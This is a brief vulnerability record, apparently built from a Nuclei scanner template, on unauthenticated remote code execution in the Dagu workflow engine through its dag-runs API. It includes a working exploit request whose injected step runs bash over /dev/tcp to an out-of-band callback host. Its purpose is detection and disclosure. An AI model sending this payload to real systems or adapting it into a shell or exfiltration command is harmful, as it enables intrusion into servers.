# Vulnerability: Dagu Workflow Engine - Remote Code Execution
**Classification:** CWE-306
**Source:** Nuclei Template (`dagu-rce.yaml`)

## Description
Dagu (<= 1.30.3) ships with authentication disabled by default. The POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and immediately executes shell commands without credentials.

## Secure Mitigation
Upgrade to a patched version.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v2/dag-runs HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}
```

